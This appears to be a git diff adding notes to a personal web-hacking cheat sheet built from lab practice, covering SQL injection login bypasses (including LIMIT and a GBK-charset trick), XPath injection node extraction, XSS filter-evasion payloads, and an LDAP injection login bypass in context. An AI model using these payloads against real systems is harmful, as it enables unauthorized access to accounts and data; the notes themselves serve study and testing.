@@ -142,3 +142,33 @@ But I've done some small XSS on HTB/wizardlabs and following are my go to guides
     - `hacker)(cn=*))%00`
         + cn=* - This is the true condition for CN
     - With this we can login as `hacker` using any password.
+
+## SQLi
+
+* The basic one is the `' OR 1=1 --` or `' OR 1=1 #`
+    - Single quote can also be replaced with double qoutes.
+
+* If error like `more then one account found` or something similar then try to use `LIMIT`
+    - `' OR 1=1 LIMIT 1 #` - This limit the output to 1
+
+* Also sometimes replacing `OR` with `||` might also help.
+* If Character set is GBK then we can use `%bf%27 OR 1=1 --`
+    - This is because the `'` get escaped due to `%bf`
+
+## XML
+
+* XPath
+    - Injecting a single `'` might result in the error. 
+    - And if it shows XPath then you can try fix the error issue by:
+        - `]%00` - sqaure brackets with the null byte
+    -  `/parent::*` - get all the parent node
+    - `/child::node()` - give child and it's node value
+    - combine both to get key and values both
+
+## XSS"//alert(1)
+
+* To be able to bypass `<script>` we can use something like `<sCRipt>`
+* Sometimes you might notice that the URL is ignoring/replacing `<script>` with empty values this can be used to get the same thing:
+    - `hacker<sc<script>ript>alert(1)</sc</script>ript>`
+* `'` can really make a difference. `alert(1)` might work but `'alert('1')'` might not. So make sure to use quotes properly.
+* If an input gets echoed then injecting some random js code something like `";var a"`
